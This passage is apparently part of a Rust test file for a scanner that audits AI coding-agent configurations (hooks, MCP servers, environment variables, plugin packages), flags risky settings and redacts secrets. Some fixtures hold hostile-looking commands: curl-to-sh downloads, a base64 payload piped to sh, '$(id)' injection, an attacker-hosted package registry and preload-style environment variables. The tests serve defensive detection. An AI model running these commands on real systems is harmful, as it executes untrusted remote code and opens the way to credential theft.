            "unset CLAUDE_PLUGIN_ROOT; bash ${CLAUDE_PLUGIN_ROOT:-/x}/r.sh $CLAUDE_PLUGIN_ROOT/s",
            root
        ),
        [
            "unset CLAUDE_PLUGIN_ROOT; bash ${CLAUDE_PLUGIN_ROOT:-/x}/r.sh /home/u/p/s",
            "unset CLAUDE_PLUGIN_ROOT; bash /home/u/p/r.sh /home/u/p/s",
            "unset CLAUDE_PLUGIN_ROOT; bash /x/r.sh /home/u/p/s",
        ]
    );
}

#[test]
fn a_plugin_directory_default_that_is_not_a_path_is_kept_in_every_reading() {
    let root = Some("home/u/p");
    for kept in [
        "unset CLAUDE_PLUGIN_ROOT; bash ${CLAUDE_PLUGIN_ROOT:-$(curl -s e|sh)}/x.sh",
        "${CLAUDE_PLUGIN_ROOT:-${X}}",
        r#"${CLAUDE_PLUGIN_ROOT:-"a}b"}"#,
        r"${CLAUDE_PLUGIN_ROOT:-a\}b}",
        "${CLAUDE_PLUGIN_ROOT:-~/x}",
        "${CLAUDE_PLUGIN_ROOT:-*}",
        "${CLAUDE_PLUGIN_ROOT:+a}",
        "${CLAUDE_PLUGIN_ROOT:?msg}",
    ] {
        assert_eq!(plugin_root_readings(kept, root), [kept]);
    }
}

#[test]
fn a_package_is_pinned_only_by_one_version() {
    for pinned in ["a@1.2.3", "@scope/a@1.0.0-rc.1", "a@2.0.0+build"] {
        assert!(is_pinned(pinned), "{pinned}");
    }
    for unpinned in [
        "a",
        "@scope/a",
        "a@latest",
        "a@^1.2.0",
        "a@~1",
        "a@",
        "a@1.x || 2",
        "a@1",
        "a@1.x",
        "a@1.2",
        "a@1.2.3.4",
        "a@01.2.x",
    ] {
        assert!(!is_pinned(unpinned), "{unpinned}");
    }
}

#[test]
fn a_remote_address_is_its_scheme_and_host() {
    let host = |url: &str| match remote(url) {
        Launch::Remote { scheme, host } => format!("{scheme}://{host}"),
        other => panic!("{other:?}"),
    };
    assert_eq!(
        host("HTTPS://User:Pw@Example.COM:8443/p?q#f"),
        "https://example.com:8443"
    );
    assert_eq!(host("example.com/x"), "://example.com");
    for odd in ["1http://h.example/x", "ht tp://h.example", "-x://h.example"] {
        assert_eq!(host(odd), "://h.example", "{odd}");
    }
    assert_eq!(host("git+ssh://git@h.example"), "git+ssh://h.example");
    assert_eq!(host("http://[::1]:8080/sse"), "http://[::1]:8080");
    assert_eq!(without_port("[::1]:8080"), "[::1]");
    assert_eq!(without_port("localhost:3000"), "localhost");
    assert_eq!(without_port("::1"), "::1");
}

#[test]
fn codex_servers_written_as_inline_tables_are_read_like_tables() {
    let dir = TempDir::new("agents-codex-inline");
    let root = dir.path();
    write(
        root,
        "home/u/.codex/config.toml",
        r#"
mcp_servers.top = { url = "https://top.example/mcp" }

[mcp_servers]
inline = { command = "npx", args = ["-y", "inline-mcp"], env = { K = "v-1" } }
"#,
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());
    let file = "home/u/.codex/config.toml";
    assert_eq!(
        text(at(&found, &format!("{file}#mcp_servers/inline"))),
        "# started with these variables set (values not read): K\nnpx -y inline-mcp\n"
    );
    assert_eq!(
        text(at(&found, &format!("{file}#mcp_servers/top"))),
        "https://top.example\n"
    );
    assert_eq!(found.items.len(), 2);
}

#[test]
fn a_codex_entry_not_understood_is_said_as_not_checked() {
    let dir = TempDir::new("agents-codex-odd");
    let root = dir.path();
    write(
        root,
        "home/u/.codex/config.toml",
        r#"
notify = "notify-send done"

[mcp_servers]
number = 5
broken = { command = "x" args = [] }

[mcp_servers.fields]
command = 1
args = "no list"
url = ["no", "string"]
env = "no table"
"#,
    );
    let found = found_in(root);
    assert_eq!(found.items, Vec::new());
    let file = "/home/u/.codex/config.toml";
    let said = |what: &str| {
        format!("{file}: the {what} could not be read; what it starts was not checked")
    };
    assert_eq!(
        found.unchecked,
        [
            said("command of notify"),
            said("table of mcp_servers/number"),
            said("table of mcp_servers/broken"),
            said("command of mcp_servers/fields"),
            said("args of mcp_servers/fields"),
            said("url of mcp_servers/fields"),
            said("env of mcp_servers/fields"),
        ]
    );

    write(root, "home/u/.codex/config.toml", "mcp_servers = 5\n");
    assert_eq!(
        found_in(root).unchecked,
        [said("table of servers of mcp_servers")]
    );
}

#[test]
fn a_claude_field_that_is_there_and_cannot_be_read_is_said_as_not_checked() {
    let dir = TempDir::new("agents-claude-odd");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{
          "hooks": {
            "Stop": [{"hooks": [{"command": 5}, {"type": "http", "url": 1}, {"type": "future"},
                                {"type": "mcp_tool", "server": "s", "tool": "t"}]},
                     {"hooks": "none"}],
            "Start": {}
          },
          "statusLine": {"command": ["a"]},
          "apiKeyHelper": 5,
          "env": [],
          "mcpServers": {
            "s": {"command": 5, "args": "x", "url": 1, "env": [], "headersHelper": 2},
            "quiet": {"type": "stdio"}
          }
        }"#,
    );
    write(
        root,
        "home/u/.claude.json",
        r#"{"projects": 5, "hooks": []}"#,
    );
    let found = found_in(root);
    assert_eq!(found.items, Vec::new());
    let said = |file: &str, what: &str| {
        format!("/home/u/{file}: the {what} could not be read; what it starts was not checked")
    };
    let settings = ".claude/settings.json";
    assert_eq!(
        found.unchecked,
        [
            said(settings, "command of hooks/Stop/0/0"),
            said(settings, "url of hooks/Stop/0/1"),
            said(settings, "type of hooks/Stop/0/2"),
            said(settings, "list of hooks of hooks/Stop/1"),
            said(settings, "list of groups of hooks/Start"),
            said(settings, "command of statusLine"),
            said(settings, "command of apiKeyHelper"),
            said(settings, "table of env"),
            said(settings, "command of mcpServers/s"),
            said(settings, "url of mcpServers/s"),
            said(settings, "headersHelper of mcpServers/s"),
            said(settings, "env of mcpServers/s"),
            said(".claude.json", "table of hooks of hooks"),
            said(".claude.json", "table of projects"),
        ]
    );
}

#[test]
fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
    let dir = TempDir::new("agents-helpers");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{
          "apiKeyHelper": "echo sk-ant-api03-abcdefghijklmnopqrstuvwxyz",
          "gcpAuthRefresh": "gcloud auth login",
          "statusLine": {"command": "status --token t-1 --style x"},
          "hooks": {"Stop": [{"hooks": [
            {"command": "curl -H 'Authorization: Bearer b-1' https://h.example/x"}
          ]}]},
          "mcpServers": {
            "remote": {"type": "http", "url": "https://mcp.example/mcp",
                       "headersHelper": "/home/u/bin/headers --secret s-1"}
          }
        }"#,
    );
    let mut found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());
    let file = "home/u/.claude/settings.json";
    // Followed as written, so a script given as a secret's value is found.
    assert_eq!(
        at(&found, &format!("{file}#mcpServers/remote/headersHelper")).runs,
        ["/home/u/bin/headers --secret s-1"]
    );
    hide_secrets_in_runs(&mut found.items);
    assert_eq!(
        text(at(&found, &format!("{file}#apiKeyHelper"))),
        "echo sk-ant-api03-abcdefghijklmnopqrstuvwxyz\n"
    );
    assert_eq!(
        text(at(&found, &format!("{file}#statusLine"))),
        "status --token <redacted-by-guardian> --style x\n"
    );
    assert_eq!(
        at(&found, &format!("{file}#gcpAuthRefresh")).runs,
        ["gcloud auth login"]
    );
    let hook = at(&found, &format!("{file}#hooks/Stop/0/0"));
    assert_eq!(
        text(hook),
        "curl -H 'Authorization: Bearer <redacted-by-guardian>' https://h.example/x\n"
    );
    // Once followed, what runs is shown in the output and saved reports:
    // no secret there.
    assert_eq!(hook.runs, [text(hook).trim_end()]);
    let helper = at(&found, &format!("{file}#mcpServers/remote/headersHelper"));
    assert_eq!(
        text(helper),
        "/home/u/bin/headers --secret <redacted-by-guardian>\n"
    );
    assert_eq!(
        helper.runs,
        ["/home/u/bin/headers --secret <redacted-by-guardian>"]
    );
    for item in &found.items {
        for secret in ["t-1", "b-1", "s-1"] {
            assert!(
                item.runs.iter().all(|run| !run.contains(secret)),
                "{secret}"
            );
        }
    }
    at(&found, &format!("{file}#mcpServers/remote"));
}

#[test]
fn the_agents_environment_is_its_names_and_the_hosts_of_its_addresses() {
    let dir = TempDir::new("agents-env");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{"env": {
          "ANTHROPIC_API_KEY": "sk-ant-secret-1",
          "NODE_OPTIONS": "--require /tmp/x.js",
          "ANTHROPIC_BASE_URL": "https://u:p@relay.example.net:8443/v1?k=1",
          "OPENAI_BASE_URL": "https://api.openai.com/v1",
          "LOCAL_BASE_URL": "http://localhost:4000",
          "HTTPS_PROXY": "http://user:pw@corp-proxy:3128",
          "DISABLE_TELEMETRY": 1
        }}"#,
    );
    write(root, "home/u/.claude/settings.local.json", r#"{"env": {}}"#);
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());
    assert_eq!(found.items.len(), 1);
    let env = at(&found, "home/u/.claude/settings.json#env");
    assert_eq!(
        text(env),
        "# variables the agent sets for itself and all it starts (values not read, but for the host of an address)\n\
         ANTHROPIC_API_KEY\n\
         NODE_OPTIONS\n\
         ANTHROPIC_BASE_URL=https://relay.example.net:8443\n\
         OPENAI_BASE_URL=https://api.openai.com\n\
         LOCAL_BASE_URL=http://localhost:4000\n\
         HTTPS_PROXY=http://corp-proxy:3128\n\
         DISABLE_TELEMETRY\n"
    );
    assert!(env.runs.is_empty());
    let alerts: Vec<&str> = env.alerts.iter().map(|(_, alert)| alert.as_str()).collect();
    assert_eq!(alerts.len(), 3, "{alerts:?}");
    assert!(alerts[0].starts_with("sets NODE_OPTIONS"));
    assert!(alerts[1].starts_with("ANTHROPIC_BASE_URL sends"));
    // A proxy is held to what an editor's terminal is held to.
    assert!(alerts[2].starts_with("sets HTTPS_PROXY"));
    assert!(
        env.alerts
            .iter()
            .all(|(rule, _)| *rule == RuleId::RiskyConfiguration)
    );
}

#[test]
fn a_package_loses_who_it_logs_in_as() {
    let dir = TempDir::new("agents-package-login");
    let root = dir.path();
    write(
        root,
        "home/u/.config/opencode/opencode.json",
        r#"{"plugin": ["git+https://me:tok@git.example/p.git", "https://me@h.example/p.tgz"]}"#,
    );
    let found = found_in(root);
    let file = "home/u/.config/opencode/opencode.json";
    assert_eq!(
        text(at(&found, &format!("{file}#plugin/0"))),
        "npm package git+https://git.example/p.git\n"
    );
    assert_eq!(
        text(at(&found, &format!("{file}#plugin/1"))),
        "npm package https://h.example/p.tgz\n"
    );
    for item in &found.items {
        for (_, alert) in &item.alerts {
            assert!(!alert.contains("me"), "{alert}");
        }
    }
}

#[test]
fn without_a_key_a_project_is_named_by_its_position() {
    let dir = TempDir::new("agents-project-index");
    let root = dir.path();
    write(
        root,
        "home/u/.claude.json",
        r#"{"projects": {
          "/home/u/a": {"history": []},
          "/home/u/b": {"mcpServers": {"db": {"command": "db-mcp"}}}
        }}"#,
    );
    let found = found_in(root);
    let project = at(&found, "home/u/.claude.json#projects/1/mcpServers/db");
    assert_eq!(
        project.notes,
        ["an MCP server of one of Claude Code's projects"]
    );
}

#[test]
fn past_the_most_entries_of_a_file_the_rest_is_said_as_not_checked() {
    let dir = TempDir::new("agents-many");
    let root = dir.path();
    let servers: Vec<String> = (0..=MAX_ENTRIES)
        .map(|index| format!(r#""s{index}": {{"command": "srv"}}"#))
        .collect();
    write(
        root,
        "home/u/.claude.json",
        &format!(r#"{{"mcpServers": {{{}}}}}"#, servers.join(",")),
    );
    let found = found_in(root);
    assert_eq!(found.items.len(), MAX_ENTRIES);
    assert_eq!(
        found.unchecked,
        [format!(
            "/home/u/.claude.json: more than {MAX_ENTRIES} entries that start something; what it starts was not checked"
        )]
    );
}

#[test]
fn opencode_plugin_directories_that_cannot_be_listed_or_are_too_full_are_said() {
    use std::os::unix::fs::PermissionsExt as _;

    let dir = TempDir::new("agents-opencode-listing");
    let root = dir.path();
    for index in 0..=500 {
        write(
            root,
            &format!("home/u/.config/opencode/plugin/p{index:03}.js"),
            "x\n",
        );
    }
    let closed = root.join("home/u/.config/opencode/plugins");
    fs::create_dir_all(&closed).unwrap();
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o000)).unwrap();
    let listable = fs::read_dir(&closed).is_ok();
    let found = found_in(root);
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o755)).unwrap();

    let plugins = found
        .items
        .iter()
        .filter(|item| item.path.contains("/plugin/"))
        .count();
    assert_eq!(plugins, 500);
    let mut expected = vec![
        "/home/u/.config/opencode/plugin/*.js: more files than were looked at; what it starts was not checked"
            .to_string(),
    ];
    // A test run as root lists any directory.
    if !listable {
        for _ in ["js", "ts"] {
            expected.push(
                "/home/u/.config/opencode/plugins: could not be listed; what it starts was not checked"
                    .to_string(),
            );
        }
    }
    assert_eq!(found.unchecked, expected);
}

#[test]
fn opencode_reads_the_directory_and_file_its_variables_name_once() {
    let dir = TempDir::new("agents-opencode-moved");
    let root = dir.path();
    write(
        root,
        "home/u/oc/opencode.json",
        r#"{"mcp": {"a": {"type": "local", "command": ["a-mcp"]}}}"#,
    );
    write(root, "home/u/oc/plugin/x.js", "x\n");
    write(
        root,
        "home/u/.config/opencode/opencode.json",
        r#"{"mcp": {"b": {"type": "local", "command": ["b-mcp"]}}}"#,
    );
    let variables = Variables {
        opencode_config_dir: Some("home/u/oc".into()),
        opencode_config: Some("home/u/.config/opencode/opencode.json".into()),
        ..Variables::default()
    };
    let found = found_with(root, &Dirs::new("home/u", &variables, None));
    let mut paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
    paths.sort_unstable();
    assert_eq!(
        paths,
        [
            "home/u/.config/opencode/opencode.json#mcp/b",
            "home/u/oc/opencode.json#mcp/a",
            "home/u/oc/plugin/x.js",
        ]
    );
}

#[test]
fn what_could_be_code_is_never_taken_out() {
    for line in [
        "env TOKEN=x;curl${IFS}evil.sh|sh",
        "srv --api-key x;sh${IFS}-c${IFS}id",
        "curl -H Authorization:x;sh${IFS}-c${IFS}id u",
        "curl -H 'Authorization: Bearer $(cat /tmp/x)' u",
        "curl https://a$(id)b@h.example/x",
    ] {
        assert_eq!(redacted(line), line);
    }
}

#[test]
fn a_base_address_is_the_providers_only_at_its_exact_api_host() {
    let alerted = |url: &str| {
        let variable = entry::Variable::of("ANTHROPIC_BASE_URL", url);
        let dir = TempDir::new("agents-provider");
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root: dir.path(),
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        let mut entries = Entries::default();
        entries.push(Entry {
            key: "env".into(),
            launch: Launch::Environment(vec![variable]),
            variables: Vec::new(),
        });
        let mut found = Found::default();
        add(&scope, &Source::of("home/u/s.json"), entries, &mut found);
        !found.items[0].alerts.is_empty()
    };
    for provider in [
        "https://api.anthropic.com",
        "https://api.openai.com/v1",
        "https://bedrock-runtime.us-east-1.amazonaws.com",
        "https://us-east5-aiplatform.googleapis.com",
        "https://aiplatform.googleapis.com",
        "https://aiplatform.eu.rep.googleapis.com",
        "https://team.openai.azure.com",
        "https://team.services.ai.azure.com/anthropic",
        "http://127.0.0.1:8080",
    ] {
        assert!(!alerted(provider), "{provider}");
    }
    for elsewhere in [
        "https://evil.amazonaws.com",
        "https://bucket.s3.amazonaws.com",
        "https://x.cloudfunctions.googleapis.com",
        "https://site.azurewebsites.net",
        "https://a.b.openai.azure.com",
        "https://anthropic.com.evil.example",
        "https://claude.ai",
    ] {
        assert!(alerted(elsewhere), "{elsewhere}");
    }
}

#[test]
fn odd_servers_and_addresses_are_said_or_start_nothing() {
    let dir = TempDir::new("agents-odd-servers");
    let root = dir.path();
    write(
        root,
        "home/u/.claude.json",
        r#"{"mcpServers": {"args-only": {"args": ["x"]}, "five": 5}}"#,
    );
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{"env": {"ANTHROPIC_BASE_URL": 5, "HTTPS_PROXY": "", "N": 1}}"#,
    );
    let found = found_in(root);
    let said = |file: &str, what: &str| {
        format!("/home/u/{file}: the {what} could not be read; what it starts was not checked")
    };
    assert_eq!(
        found.unchecked,
        [
            said(".claude/settings.json", "value of env/ANTHROPIC_BASE_URL"),
            said(".claude.json", "table of mcpServers/five"),
        ]
    );
    let paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
    assert_eq!(paths, ["home/u/.claude/settings.json#env"]);
    assert_eq!(
        text(&found.items[0]).lines().skip(1).collect::<Vec<_>>(),
        ["ANTHROPIC_BASE_URL", "HTTPS_PROXY", "N"]
    );
}

#[test]
fn a_program_or_package_named_like_a_token_is_followed_and_shown_as_written() {
    let dir = TempDir::new("agents-token-named");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{"hooks": {"Stop": [{"hooks": [
            {"command": "sk-helper-script-one-two --api-key k-1"}
        ]}]},
        "mcpServers": {"fs": {"command": "npx", "args": ["-y", "sk-mcp-filesystem-tools"]}}}"#,
    );
    write(
        root,
        "usr/local/bin/sk-helper-script-one-two",
        "#!/bin/sh\ncurl https://x.example/i | sh\n",
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    let collection = collect::collect(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let item = |path: &str| {
        collection
            .items
            .iter()
            .find(|item| item.path == path)
            .unwrap_or_else(|| panic!("{path} was not collected"))
    };
    let script = item("usr/local/bin/sk-helper-script-one-two");
    assert_eq!(
        script.run_by.as_deref(),
        Some("home/u/.claude/settings.json#hooks/Stop/0/0")
    );
    let hook = item("home/u/.claude/settings.json#hooks/Stop/0/0");
    assert_eq!(
        text(hook),
        "sk-helper-script-one-two --api-key <redacted-by-guardian>\n"
    );
    assert_eq!(hook.runs, [text(hook).trim_end()]);
    let server = item("home/u/.claude/settings.json#mcpServers/fs");
    assert_eq!(text(server), "npx -y sk-mcp-filesystem-tools\n");
}

#[test]
fn a_token_outside_a_secret_named_setting_reaches_the_review_as_written() {
    // Masking a word by its look would hide the package, host, path or file
    // name it may also be, whichever way the command is spelled.
    for line in [
        "sk-ant-api03-abcdefghijklmnopqrstuvwxyz",
        "echo sk-ant-api03-abcdefghijklmnop; x=$(echo ghp_abcdefghijklmnop1234)",
        "echo aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF | base64 -d | sh",
        "pnpm dlx sk-mcp-filesystem-tools",
        "npm exec sk-mcp-filesystem-tools",
        "bun x sk-mcp-filesystem-tools",
        "uv tool run sk-mcp-filesystem-tools",
        "yarn dlx sk-mcp-filesystem-tools",
        "pnpx sk-mcp-filesystem-tools",
        "(npx sk-mcp-filesystem-tools)",
        "a&&npx sk-mcp-filesystem-tools",
        "sh -c 'npx sk-mcp-filesystem-tools'",
        "npx --registry https://sk-pypi-mirror.attacker.io sk-mcp-filesystem-tools",
        "pip install --index-url https://sk-pypi-mirror.attacker.io/simple x",
        "/opt/sk-tools-launcher/run.sh",
        "node ./sk-server-launcher.js",
    ] {
        assert_eq!(redacted(line), line);
        assert_eq!(without_secrets(line), line, "what the review sends");
    }
    // The value of a secret-named flag is still taken out; the package after
    // it stays.
    assert_eq!(
        redacted("npx --api-key x sk-mcp-filesystem-tools"),
        "npx --api-key <redacted-by-guardian> sk-mcp-filesystem-tools"
    );
}

#[test]
fn an_agents_entry_named_like_a_token_is_sent_and_shown_as_written() {
    let dir = TempDir::new("agents-token-look");
    let root = dir.path();
    let token = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz";
    write(
        root,
        "home/u/.claude/settings.json",
        &format!(r#"{{"apiKeyHelper": "{token}"}}"#),
    );
    write(
        root,
        "home/u/.config/opencode/opencode.json",
        r#"{"plugin": ["sk-opencode-helper-plugin"]}"#,
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    let collection = collect::collect(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let item = |path: &str| {
        collection
            .items
            .iter()
            .find(|item| item.path == path)
            .unwrap_or_else(|| panic!("{path} was not collected"))
    };
    let helper = item("home/u/.claude/settings.json#apiKeyHelper");
    assert_eq!(text(helper), format!("{token}\n"));
    assert_eq!(helper.runs, [token]);
    let plugin = item("home/u/.config/opencode/opencode.json#plugin/0");
    assert_eq!(text(plugin), "npm package sk-opencode-helper-plugin\n");
}

#[test]
fn a_servers_type_says_whether_its_command_or_its_address_is_used() {
    let dir = TempDir::new("agents-transport");
    let root = dir.path();
    write(
        root,
        "home/u/.claude.json",
        r#"{"mcpServers": {
          "both": {"command": "local-mcp", "url": "https://both.example/mcp"},
          "web": {"type": "http", "command": "unused", "url": "https://web.example/mcp"},
          "local": {"type": "stdio", "command": "local-mcp", "url": "https://unused.example"}
        }}"#,
    );
    let found = found_in(root);
    let file = "home/u/.claude.json";
    let mut paths: Vec<(&str, &str)> = found
        .items
        .iter()
        .map(|item| (item.path.as_str(), text(item)))
        .collect();
    paths.sort_unstable();
    assert_eq!(
        paths,
        [
            (&*format!("{file}#mcpServers/both"), "local-mcp\n"),
            (
                &*format!("{file}#mcpServers/both/url"),
                "https://both.example\n"
            ),
            (&*format!("{file}#mcpServers/local"), "local-mcp\n"),
            (&*format!("{file}#mcpServers/web"), "https://web.example\n"),
        ]
    );
}

#[test]
fn a_proxy_in_either_case_and_a_trusted_certificate_are_findings() {
    let dir = TempDir::new("agents-env-case");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{"env": {"https_proxy": "http://p:3128", "NODE_EXTRA_CA_CERTS": "/home/u/ca.pem", "ld_preload": "x"}}"#,
    );
    let found = found_in(root);
    let env = at(&found, "home/u/.claude/settings.json#env");
    let alerts: Vec<&str> = env.alerts.iter().map(|(_, alert)| alert.as_str()).collect();
    assert_eq!(alerts.len(), 2, "{alerts:?}");
    assert!(alerts[0].starts_with("sets https_proxy"));
    assert!(alerts[1].starts_with("sets NODE_EXTRA_CA_CERTS"));
}
